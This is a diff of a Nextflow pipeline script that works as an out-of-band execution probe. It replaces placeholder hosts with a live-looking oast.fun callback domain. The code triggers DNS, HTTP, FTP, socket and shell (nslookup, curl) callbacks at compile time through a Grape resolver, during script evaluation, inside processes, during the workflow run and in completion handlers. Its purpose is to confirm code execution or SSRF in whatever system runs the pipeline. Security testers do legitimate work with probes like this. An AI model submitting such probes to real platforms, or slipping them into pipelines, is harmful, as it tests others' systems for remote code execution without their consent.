@@ -16,49 +16,49 @@ nextflow.enable.dsl=2
 
 // ================= COMPILE-TIME (Grape dependency resolution -> outbound to YOUR host) =================
 // Forces Groovy Grape to fetch an artifact from a resolver you control = compile-time HTTP callback.
-@GrabResolver(name='probe', root='http://grab-resolver.COLLAB/')
+@GrabResolver(name='probe', root='http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/')
 @Grab(group='probe', module='probe', version='1.0')
 import java.net.InetAddress
 
 // ================= SCRIPT-EVAL PHASE (compile / -preview / -stub / DSL evaluation) =================
-try { InetAddress.getByName('main-eval-dns.COLLAB') }           catch (Throwable t) {}
-try { new URL('http://main-eval-http.COLLAB/').getText() }      catch (Throwable t) {}
-try { new URL('https://main-eval-https.COLLAB/').getBytes() }   catch (Throwable t) {}
-try { new Socket('main-eval-sock.COLLAB', 80).close() }         catch (Throwable t) {}
+try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }           catch (Throwable t) {}
+try { new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() }      catch (Throwable t) {}
+try { new URL('https://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getBytes() }   catch (Throwable t) {}
+try { new Socket('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun', 80).close() }         catch (Throwable t) {}
 try { 'nslookup main-eval-exec.COLLAB'.execute() }              catch (Throwable t) {}
 try { Runtime.getRuntime().exec(['sh','-c','nslookup main-eval-runtime.COLLAB'] as String[]) } catch (Throwable t) {}
 
 // Nextflow-native remote fetch: file()/Channel can pull http/https/ftp/s3 transparently.
-try { file('http://main-file-http.COLLAB/x').exists() }         catch (Throwable t) {}
-try { file('ftp://main-file-ftp.COLLAB/x').exists() }           catch (Throwable t) {}
+try { file('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/x').exists() }         catch (Throwable t) {}
+try { file('ftp://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/x').exists() }           catch (Throwable t) {}
 
 params.greeting = 'hello'
 
 // ================= TASK EXEC PHASE (Groovy on the head node when the process runs) =================
 process probe_exec {
   exec:
-    try { InetAddress.getByName('proc-exec-dns.COLLAB') }       catch (Throwable t) {}
-    try { new URL('http://proc-exec-http.COLLAB/').getText() }  catch (Throwable t) {}
+    try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }       catch (Throwable t) {}
+    try { new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() }  catch (Throwable t) {}
 }
 
 // ================= TASK SCRIPT PHASE (runs in the executor/task sandbox) =================
 process probe_script {
   script:
   """
-  nslookup proc-script-dns.COLLAB || true
-  curl -s http://proc-script-http.COLLAB/ || true
-  getent hosts proc-script-getent.COLLAB || true
+  nslookup bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun || true
+  curl -s http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.funB/ || true
+  getent hosts bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun || true
   """
 }
 
 // ================= WORKFLOW / RUN PHASE =================
 workflow {
-  try { InetAddress.getByName('wf-run-dns.COLLAB') }            catch (Throwable t) {}
-  try { new URL('http://wf-run-http.COLLAB/').getText() }       catch (Throwable t) {}
+  try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }            catch (Throwable t) {}
+  try { new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() }       catch (Throwable t) {}
   probe_exec()
   probe_script()
 }
 
 // ================= COMPLETION HANDLERS =================
-workflow.onComplete { try { InetAddress.getByName('main-oncomplete.COLLAB') } catch (Throwable t) {} }
-workflow.onError    { try { InetAddress.getByName('main-onerror.COLLAB') }    catch (Throwable t) {} }
+workflow.onComplete { try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') } catch (Throwable t) {} }
+workflow.onError    { try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }    catch (Throwable t) {} }
